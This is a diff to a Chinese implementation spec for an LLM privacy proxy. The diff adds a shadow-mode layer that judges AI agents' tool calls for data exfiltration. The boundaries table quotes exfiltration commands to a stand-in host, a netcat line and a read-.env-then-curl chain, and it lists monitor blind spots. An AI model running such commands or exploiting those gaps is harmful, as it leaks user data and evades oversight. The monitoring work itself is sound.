@@ -1,12 +1,14 @@
 # LLMate Gate 实现规格（AS-BUILT）
 
-> **文档版本**：v1.5（2026-09-15）
+> **文档版本**：v1.6（2026-09-23）
 > **层级**：L2-AsBuilt（实现现状规格）
 > **取证基线**：`origin/main @ 0a21dfa`（v1.0 取证于 `c64f246`；v1.1 增补第 6 批缺陷修复；
 > v1.2 增补 §9.1 的 `bench-gate` 守门与子模块锚点约定；
 > v1.3 增补 §5.2 的热加载并发约定与 §9.1 的 CI 失败自述；
 > v1.4 增补 §9.1 的 job 级联依赖说明；
-> v1.5 增补 §9.1 的门禁解耦 —— `needs` 只表达产物依赖）
+> v1.5 增补 §9.1 的门禁解耦 —— `needs` 只表达产物依赖；
+> v1.6 新增 §15 判断层（Judge）实现，修正 §6.2 `tool_call_scan` 的错误陈述并新增 §6.2.1，
+> §7.2 指标 16 → 19）
 > **取证方法**：全量 `git log`（92 commit）+ 逐包读源码 + 本机实际编译运行验证。
 > **核心规则**：**本文档以代码为唯一事实来源。** 任何与 `HANDOFF.md` / `Specs/00` 冲突之处，以本文档为准；本文档与代码冲突时，以代码为准并回来更新本文档。
 > **不回答的问题**：为什么这样设计（见 `Specs/00`）、原始排期（见 `Specs/01`）。
@@ -48,7 +50,7 @@
 
 ```
 gateway/
-├─ cmd/                      5 个入口
+├─ cmd/                      6 个入口（含 judge-bench）
 ├─ internal/
 │  ├─ config/    配置加载、${ENV} 展开、身份卡展开、启动期校验
 │  ├─ registry/  登记表（用户自报 PII 值 → 精确匹配补召回）
@@ -59,21 +61,22 @@ gateway/
 │  ├─ simulator/ 格式保持仿真值生成（8 类实体）+ 身份卡
 │  ├─ policy/    per-type 命运（reversible/mask/redact）决策
 │  ├─ vault/     映射表加密存储（AES-256-GCM + scrypt，TTL 清扫）
+│  ├─ judge/     行为判断层骨架：rules/openai/http 后端、降级链、Mapper、探针、评测（§15）
 │  ├─ pipeline/  编排器：串起 检测→替换→存储→还原
-│  ├─ proxy/     HTTP 反向代理：多协议上游路由、tool_call 扫描、流式还原
+│  ├─ proxy/     HTTP 反向代理：多协议上游路由、tool_call 扫描、流式还原、判断层旁挂
 │  ├─ server/    HTTP 服务层：路由、鉴权、healthz、metrics
 │  ├─ audit/     结构化审计（JSON Lines + 内存环 200 条）
-│  ├─ metrics/   16 个 Prometheus 指标
+│  ├─ metrics/   19 个 Prometheus 指标
 │  └─ errors/    错误码
 ├─ pkg/
-│  ├─ types/     跨包共享类型 + 15 类实体权威表
+│  ├─ types/     跨包共享类型 + 15 类实体权威表 + 判断层契约（judge.go）
 │  ├─ cn/        中文实体校验（身份证校验位、手机号段、Luhn）
 │  └─ global/    国际实体校验（URL / US SSN / 信用卡）
 ├─ debug/        内嵌面板：Hub(WS) + Store(环) + Handler(API) + assets
 └─ configs/      示例与冒烟配置
 ```
 
-依赖方向单向：`cmd → server/proxy → pipeline → {detector, replacer, vault, cache, audit, metrics}`；`registry` 与 `circuit` 以装饰器方式包在 `detector` 外层（`registry.Wrap` → `circuit.NewGuardedClient`），不侵入检测器内部。
+依赖方向单向：`cmd → server/proxy → pipeline → {detector, replacer, vault, cache, audit, metrics}`；`registry` 与 `circuit` 以装饰器方式包在 `detector` 外层（`registry.Wrap` → `circuit.NewGuardedClient`），不侵入检测器内部。判断层是**旁挂**：`proxy → judge → pkg/types`，`judge` 不依赖 `config`（配置投影在 `cmd/llmate-gate` 里做）。
 
 ### 1.3 一条请求的完整生命周期
 
@@ -251,9 +254,9 @@ replacement:
   per_type_fate: {}            # entity_type → reversible | mask | redact
 
 policy:
-  fail_closed: true
-  tool_call_scan: true
-  stream_restore: true
+  fail_closed: true          # 三个字段里只有这个是真实开关（main.go 读它）
+  tool_call_scan: true       # 历史遗留：只能为 true/省略，写 false 启动期报错
+  stream_restore: true       # 历史遗留：同上
 
 vault:
   path: "./vault_data"
@@ -510,13 +513,25 @@ Merkle 的用途是**多轮对话只扫新增 turn**：请求体里 `messages` �
 
 ### 6.2 tool_call 扫描
 
-`policy.tool_call_scan` 控制。递归遍历请求体，对 `tool_calls` 的 `arguments` 逐个值做检测替换；支持嵌套结构；**JSON 字符串里内嵌的 PII 也会被处理**（`transform` / `anonymizeJSONString`，`proxy.go:317-411`）。
+**始终开启，没有开关**。递归遍历请求体，对 OpenAI `tool_calls[].function.arguments` 与 Anthropic `tool_use.input` 逐个值做检测替换；支持嵌套结构；**JSON 字符串里内嵌的 PII 也会被处理**（`transform` `proxy.go:353` / `anonymizeJSONString` `proxy.go:424`）。
+
+> 配置里的 `policy.tool_call_scan` 是**历史遗留键，代码从未读取它**——过去写 `false` 什么都不会发生，是一句无声的谎话。现在合法取值收窄成 `true`（或缺省），写 `false` 在启动期报错。不给它真开关的理由：tool_calls 的 arguments 承载命令、路径、模型自造字面量，是整份请求里 PII 密度最高、最容易被外发的位置。详见 `config.PolicyConfig` 注释。
 
 > 同一段文本出现在**同一请求的多个字段**时，每个字段都必须独立脱敏——不能因为「这个值我已经替换过了」就跳过。L2 泄漏级对等性测试（§10.3 的 `tool_call_nested` 载体）正是用这个场景做探针的。
 
 有一个已修复的坑值得留档（`07481b0`）：`tool_call.arguments` 脱敏后必须**仍是 JSON 字符串**，不能变成对象——否则上游 API 直接报 400。
 
-Anthropic 的 `tool_use.input` 结构不同（在 `content` 列表里嵌 dict，且 `type` 字段不是 PII 字段名），有单独的白名单处理（`proxy.go:80-104`）。
+Anthropic 的 `tool_use.input` 结构不同（在 `content` 列表里嵌 dict，且 `type` 字段不是 PII 字段名），靠 `piiBlockTypes` 容器型 block 表强制进入 PII 上下文（`proxy.go:108-132`）。
+
+### 6.2.1 判断层观测（P2 旁挂）
+
+代理在遍历请求体的**同一个递归**里顺带喂给行为判断层一个结构化描述子（`observeToolCall` `proxy.go:472`；`transform` / `anonymizeJSONString` 的 `observe` 回调参数）：
+
+- 取 `block["name"]` 作工具名，`arguments`（OpenAI）或 `input`（Anthropic，**必须 `type` 命中 `tool_use`/`server_tool_use`/`mcp_tool_use`**）作参数；
+- 从 `commandFields`（`command`/`cmd`/`script`/`code`/`shell`/`url`/`file_path`/`path`/`pattern`）里取第一个命中的字符串作 `Command`，`Target` 取首词；
+- 调 `judgment.Evaluate`，只打日志与指标。
+
+**关键约束**：`observeToolCall` 无返回值——不修改 block、不写映射表、不影响字节。影子模式下开关判断层的上游字节与客户端响应必须逐字节相同，由 `TestProxy_JudgmentShadow_DoesNotChangeTraffic` 钉住。它看到的是**原始命令**（脱敏前的值），因为判断对象是「模型想做什么」，不是「脱敏后剩什么」。
 
 ### 6.3 请求改写要点
 
@@ -545,9 +560,9 @@ sample_text
 
 `Export: ["pip", "gdpr"]` 声明合规导出目标。
 
-### 7.2 Prometheus 指标（16 个）
+### 7.2 Prometheus 指标（19 个）
 
-`llmate_requests_total{endpoint,outcome}`、`llmate_detect_latency_seconds{engine}`、`llmate_replace_total{fate}`、`llmate_restore_total{endpoint}`、`llmate_blocked_total{reason}`（即 fail-closed 阻断）、`llmate_upstream_errors_total{endpoint,status}`、`llmate_stream_orphan_placeholders_total{endpoint}`、`llmate_detect_cache_hits_total{conversation}`、`llmate_detect_cache_misses_total{conversation}`、`llmate_detect_incremental_segments_total{action}`、`llmate_vault_size`、`llmate_active_streams`、`llmate_pii_detected_total{entity_type,fate}`、`llmate_tool_calls_scanned_total`、`llmate_request_total_latency_seconds{endpoint}`、`llmate_response_restore_latency_seconds{endpoint}`。
+`llmate_requests_total{endpoint,outcome}`、`llmate_detect_latency_seconds{engine}`、`llmate_replace_total{fate}`、`llmate_restore_total{endpoint}`、`llmate_blocked_total{reason}`（即 fail-closed 阻断）、`llmate_upstream_errors_total{endpoint,status}`、`llmate_stream_orphan_placeholders_total{endpoint}`、`llmate_detect_cache_hits_total{conversation}`、`llmate_detect_cache_misses_total{conversation}`、`llmate_detect_incremental_segments_total{action}`、`llmate_vault_size`、`llmate_active_streams`、`llmate_pii_detected_total{entity_type,fate}`、`llmate_tool_calls_scanned_total`、`llmate_request_total_latency_seconds{endpoint}`、`llmate_response_restore_latency_seconds{endpoint}`、**`llmate_verdict_total{action,category,engine}`**、**`llmate_judge_latency_seconds{engine}`**、**`llmate_judge_unavailable_total{engine,reason}`**（后三个为判断层，见 §15.6）。
 
 延迟类指标**单位统一为秒**（Prometheus 惯例）。指标名属公共接口，改名会破坏已对接的 Grafana/告警，故冻结。
 
@@ -885,3 +900,204 @@ python3 bench_runner_adversarial.py --endpoint http://127.0.0.1:8413/v1/privacy/
 5. 新增指标 → 更新 §7.2。
 6. 每次跑完真对抗语料 → 更新 §10。
 7. **本文档不记录排期与待办**（那是 `HANDOFF.md` §5 的职责），只记录「现在是什么样」。
+
+---
+
+## 15. 判断层（Judge）实现
+
+> 契约在 `Specs/02` §12。本节记录**代码里实际存在、且经运行验证**的部分。
+
+### 15.1 定位：BYOM 骨架，不是「运一个模型」
+
+这一层回答的问题与检测层不同：
+
+| | 检测层（§4） | 判断层（本节） |
+|---|---|---|
+| 看什么 | 文本**内容**里有没有 PII | 动作**意图**会不会把数据带出去 |
+| 输入 | 一段字符串 | `ActionDescriptor`（工具名 + 命令 + 目标） |
+| 输出 | 实体 + 偏移 | `Evidence`（类别 + 严重度）→ `Verdict`（档位） |
+| 模型 | 自带 regex / NER | **不预置**，由用户自选（BYOM） |
+
+**我们交付的是骨架**：契约类型、降级链、确定性 Mapper、约束解码适配、探针、评测工具、接线。
+**我们交付的不是模型**：`judgment.backends` 为空时这一层根本不存在，网关行为与从前逐字节相同——
+这一点由 `TestProxy_JudgmentDisabledProducesNothing` 与 `TestProxy_JudgmentShadow_DoesNotChangeTraffic` 钉住。
+
+### 15.2 包结构与数据流
+
+| 文件 | 职责 |
+|---|---|
+| `pkg/types/judge.go`（430 行） | 契约权威实现：四个闭集、`ActionDescriptor` / `Evidence` / `Verdict` / `Capabilities` / `JudgmentThresholds` |
+| `internal/judge/judge.go` | `Kind` 闭集（`rules`/`openai`/`http`）、`Spec`、`Judge` 接口、三个错误、`withTimeout` |
+| `internal/judge/rules.go`（721 行） | 确定性规则后端（唯一自带后端） |
+| `internal/judge/argv.go` | 手写 shell 分词：引号/转义/`;`/`&&`/`\|\|`/`\|`/重定向；剥 `sudo`/`env`/`sh -c` 包装 |
+| `internal/judge/openai.go` | OpenAI 兼容适配（含约束解码、宽容解析、输入上限） |
+| `internal/judge/http.go` | `HTTPEndpoint` 逃生口（POST 描述子，响应过同一套闭集校验） |
+| `internal/judge/map.go` | 确定性 Mapper、白名单、`Evaluator` |
+| `internal/judge/chain.go` | 降级链 |
+| `internal/judge/factory.go` | `NewFromSpecs`：按 kind 构造 + per-backend 阈值 |
+| `internal/judge/probe.go` | 20 条内置探针 + 双向塌缩检测 |
+| `internal/judge/bench.go` | JSONL 评测集 + 漏报/误报口径 |
+| `internal/config/judgment.go` | 配置 + 启动期校验 |
+| `cmd/judge-bench/main.go` | 给用户跑自己模型的 CLI |
+
+依赖方向：`proxy → judge → pkg/types`（`judge` 不依赖 `config`——配置投影在 `cmd/llmate-gate` 的 `buildJudgment` 里做）。
+
+数据流（影子模式）：
+
+```
+请求体 → transform/anonymizeJSONString 递归
+           └─ observe 回调 → observeToolCall（proxy.go:472）
+                └─ 构造 ActionDescriptor（原始命令，脱敏前的值）
+                     └─ Evaluator: Chain → 后端 → Evidence
+                          └─ Mapper: Evidence → Verdict
+                               ├─ 指标 llmate_verdict_total / judge_latency_seconds
+                               └─ 非 allow 时 log.Printf 全部字段
+                              （到此为止：不改字节、不改 action、无返回值）
+```
+
+### 15.3 四条红线与它们的落实位置
+
+| 红线 | 落实方式 | 不是靠 |
+|---|---|---|
+| R1 模型不出决策只出证据 | `Evidence` 类型**没有** `action` 字段，`Action` 只能由 `Mapper` 产出 | 纪律要求 |
+| R2 判断层不联网 | 配置期 `validateLocalEndpoint` 拒绝公网 IP / 非 IP 主机名（**DNS 可被改，配置期无法验证，故一律拒绝**）；`http.Client.Proxy = nil`；`CheckRedirect` 返回错误 | 注释提醒 |
+| R3 不改现有语义 | `observeToolCall` **无返回值**；只读 `ActionDescriptor`，不写映射表 | 测试断言 |
+| R4 fail-safe 不 fail-open | 超时 / 解析失败 / 塌缩 / 全链不可用 → 降级；`FailClosed` 时 `review` | 默认值 |
+
+**R2 的两个容易漏点**：`http.ProxyFromEnvironment` 是 `http.Client` 的**默认值**——不显式置 `nil`，`HTTPS_PROXY` 环境变量就会把「本地判断」变成一次外部请求；`CheckRedirect` 不拦，`127.0.0.1` 上的服务可以把请求 302 到公网。两处都有专门测试（`TestNewLocalHTTPClient_Hardening`）。
+
+### 15.4 后端矩阵与降级链
+
+| kind | 用途 | `Deterministic` | `GivesConfidence` | `SchemaModes` |
+|---|---|---|---|---|
+| `rules` | 自带确定性后端（**不接模型也能用**） | ✅ | ❌ | — |
+| `openai` | 任意 OpenAI 兼容端点（llama.cpp / vLLM / Ollama / LM Studio / 云端） | ❌ | ✅ | `json_schema` / `gbnf` / `format` / `prompt_only` |
+| `http` | 自建服务的逃生口 | ❌ | ✅ | `prompt_only` |
+
+**这里刻意没有 `laya` / `localjev` 这两个 kind。** 它们要么走 OpenAI 兼容端点（`openai`），要么走自建 HTTP（`http`）——给具体模型开 kind 等于把「用户自选」写死成「我们选」。
+
+`chain` 是**降级链，不是优先级链**：「首个命中」= 首个给出**非 `unknown`** 结论的后端。若把 `unknown` 算命中，一个恒返回 `unknown` 的坏模型会堵死整条链。`Verdict.Degraded = true` 表示结论来自下标 > 0 的后端。
+
+约束解码优先级 `json_schema > gbnf > format > prompt_only`（`BestSchemaMode` 取最强可用者）。`prompt_only` 是唯一 `Constrained() == false` 的模式——即使它，解析仍走闭集校验，越界值报 `ErrInvalidOutput` 而不是被夹取。
+
+### 15.5 确定性 Mapper 与 per-backend 阈值
+
+```go
+score = Severity × (GivesConfidence ? Confidence : 1)
+```
+
+三条短路，顺序即优先级：
+
+| 条件 | 结果 | 理由 |
+|---|---|---|
+| `category == unknown` | `review` | 判不了就交人，`unknown` 是一等公民 |
+| `GivesConfidence && Confidence < 0.50` | `review` | 双向防护：不可信的高危不能触发不可逆动作，不可信的低危也不能被当成「没事」 |
+| 其余 | `score` 落阈值表 | |
+
+缺省阈值 `block 0.85 / review 0.55 / redact 0.30`，`Validate()` 要求**严格递减**。
+
+`benign` **不做特例**：它照样走 `score = severity`。理由是 `benign` + 高 severity 是个自相矛盾但可能出现的输出，给它开后门会让矛盾被静默放行。
+
+**阈值是 per-backend 的**（`Evaluator.SetMapper` 逐个设置）。理由是可实测的：confidence 跨后端不可比——同一个模型在不同语种/任务上会给出「准确率 0.000 而置信度 95.2%」这种组合，用一张表会把它的高置信低危结论放行了。
+
+### 15.6 观测位、接线与指标
+
+三个可能的位置，只有两个可用：
+
+| 观测位 | 时机 | 状态 |
+|---|---|---|
+| ① 当轮响应流 | 执行**前** | 未接（需要流式中断） |
+| ② 请求体回灌 | 执行**后** | ✅ 本次接线（P2） |
+| ③ 内部思考流 `thinking`/`reasoning` | — | **不接且不该接**：不透明块跳过，且下一轮常不回传 |
+
+⇒ 判定必须建在协议强制的 `tool_calls` / `tool_use` 结构化字段上，不能建在自然语言上。这条约束也是 `ActionDescriptor.Command`（原始命令行文本）存在的原因：`bash -c "tar ..."` 只留 token 会丢掉引号边界。
+
+指标：`llmate_verdict_total{action,category,engine}`、`llmate_judge_latency_seconds{engine}`、`llmate_judge_unavailable_total{engine,reason}`。
+
+`llmate_judge_unavailable_total` 是**诚实指标**：判断层挂掉时请求照样 200（影子模式不改行为），所以「它死了」这件事只能靠这个计数器体现。`TestProxy_JudgmentUnavailableIsVisible` 断言后端不可达时响应仍 200、该指标有计数、而 `verdict_total` 为 0。
+
+### 15.7 能力自检（塌缩检测）与 judge-bench
+
+**为什么不问准确率**：BYOM 定位下我们不为用户的模型质量负责，我们负责的是「一个坏掉的模型不会静默变成放行」。本地小模型最常见的失效不是偶尔判错，是**恒定输出**：
+
+| 塌缩方向 | 表象 | 后果 |
+|---|---|---|
+| 恒 `benign` | 看起来一切正常 | 这一层等于不存在 |
+| 恒高危 | 所有动作都被拦 | 用户会直接把整层关掉 |
+
+判据因此是**两个方向**：对 10 条无害探针不能有一半以上被判非 allow，对 10 条高危探针不能有一半以上被判 allow（`collapseThreshold = 0.5`）。判据建在 **Mapper 后的动作档位**上，且**固定用内置缺省阈值、不读用户配置**——自检要回答「这个后端本身靠不靠谱」，掺进用户阈值就分不清是模型问题还是调参问题。
+
+`judge-bench` 是给用户的工具（`-kind` / `-base-url` / `-model` / `-schema-mode` / `-timeout` / `-cases` / `-json` / `-skip-probe`），退出码 `0` 健康 / `1` 疑似塌缩或有漏报 / `2` 用法错误。它只构造**单个后端不套链**——套链测出来的会是「链里最稳的那个」。
+
+评测集格式（JSONL，一行一条）样例见 `gateway/cmd/judge-bench/testdata/cases_example.jsonl`。`want` 标的是**你希望这个动作被归到哪一类**，不是「你希望它被拦」；该不该拦是从 `want` 推出来的（`benign` 不该拦，其余该拦）。
+
+### 15.8 配置（`judgment` 段）
+
+```yaml
+judgment:
+  enabled: false        # 新增一个「能拦请求」的组件，默认姿态必须是「不生效」
+  mode: shadow          # v1 只接受 shadow（见下）
+  fail_closed: true
+  timeout: 300ms
+  backends:
+    - name: rules
+      kind: rules
+    - name: local
+      kind: openai
+      base_url: http://127.0.0.1:11434/v1
+      model: qwen2.5:1.5b
+      schema_mode: prompt_only
+      thresholds: { block: 0.9, review: 0.6, redact: 0.3 }   # per-backend
+  points:               # 三个观测位开关，默认全 false
+    tool_params: false
+    egress_text: false
+    mcp_ask: false
+  whitelist:
+    hosts: ["127.0.0.1", ".internal.example.com"]   # 前缀 . 表示后缀匹配
+    tools: []
+```
+
+启动期校验（失败即退出，无降级）：`mode` 只接受 `shadow`（**`enforce` 直接拒绝**并给出解释——v1 的 verdict 只观测不执行，接受一个空转的 `enforce` 比拒绝它更危险）；`timeout` ∈ (0, 1s]；`backends` ≤ 4 且名字唯一；`enabled: true` 时 `backends` 不能为空；`base_url` 必须是回环/私网/链路本地。
+
+### 15.9 本机实测（2026-09-23）
+
+`go run ./cmd/judge-bench -kind rules`：
+
+```
+后端 rules：20 条探针，结论 健康
+  对无害动作的误判率 0.000  （> 0.50 视为塌缩到「一律拦」）
+  对高危动作的漏判率 0.000  （> 0.50 视为塌缩到「一律放」）
+  判不了 0 条，失败 0 条，p50 0ms p95 0ms
+```
+
+`go run ./cmd/judge-bench -kind rules -cases ./cmd/judge-bench/testdata/cases_example.jsonl`：
+
+```
+后端 rules：23 条样本，成功判定 23，失败 0，判不了(unknown) 2
+动作级  漏报率 0.000（0/13 该拦）  误报率 0.000（0/10 不该拦）
+类别级  命中率 0.957（22/23）
+延迟    p50 0ms  p95 0ms
+```
+
+> **这两个数字不能外推。** 它们衡量的是**自带规则后端**在**我们自己写的**样本上的表现，不是「判断层有多准」。真正的数字要用户拿自己链路上抓下来的动作、跑自己选的模型才有——这也正是 `judge-bench` 存在的原因。
+
+测试规模：9 个测试文件、97 个测试函数（`internal/judge` 56 + `pkg/types` 11 + `internal/config` 19 + `internal/proxy` 11）。
+
+### 15.10 已声明的边界（诚实清单）
+
+| 边界 | 说明 |
+|---|---|
+| **规则只覆盖结构性动作** | 打包 / 凭证路径 / 批量读 / 外发 / 破坏性。语义级意图（「这个操作危不危险」）不判，那是模型后端的事 |
+| **间接引用只能降级** | `t=tar; $t -czf .`、`timeout 60 tar ...` → `unknown`（→ review）。规则只看得到字面量，不猜档位 |
+| **无 scheme 目标不可见** | `ssh host`、`nc host 4444` 读不出 host，以及「无 scheme + 确定在送」（`curl -T f evil.example.com/up`）→ `unknown`（→ review）。判 unknown 而不判 benign：读不出目标是「看不见」不是「没有」 |
+| **`curl` / `wget` 方向判据是启发式** | 无正文旗标且无 shell 替换 → 视为「只取回」。方向不确定时一律退回按外发处理，所以只会多报不会漏报 |
+| **残余：无 scheme + 取回** | `curl example.com/x` 仍落 benign。补齐需把「无 scheme 主机名」与本地文件名分开，而 `backup.tar.gz` 与 `example.com` 形状同构。危险的那一半（带正文旗标）已覆盖；详见 `Specs/06` #28 |
+| **只看单次动作，不看会话** | 判断是无状态的。「先 `cat .env` 再 `curl`」这种跨轮外泄链路**当前不可见**——要接当轮响应流（观测位 ①）才能覆盖 |
+| **`shadow` 不拦任何东西** | v1 的 verdict 只进日志与指标。开启判断层不会改变任何一个请求的结果 |
+| **思考流不接** | `thinking`/`reasoning` 是不透明块，且下一轮常不回传，不作为判据来源 |
+
+### 15.11 `policy` 下两个历史遗留键
+
+`policy.tool_call_scan` 与 `policy.stream_restore` 是**假开关**：被定义、被写进默认配置 / 示例 YAML / Specs，但代码里从没有任何一处读它们，对应行为始终无条件执行。也就是说 `tool_call_scan: false` 过去是一句无声的谎话。
+
+现在的处理是**只能为真（或整行省略）**，写 `false` 在启动期报错。不直接删字段是因为严格解析（`KnownFields`）会让所有已发布的、带这一行的配置在升级后拒绝启动；不给它们接上真开关是因为这两个行为都不可选——tool_calls 的 arguments 是整份请求里 PII 密度最高的位置，占位符不还原客户端拿到的是 `<<zh_phone_1>>`。细节见 `config.PolicyConfig` 注释；测试 `TestConfig_LegacyAlwaysOnKeys`。
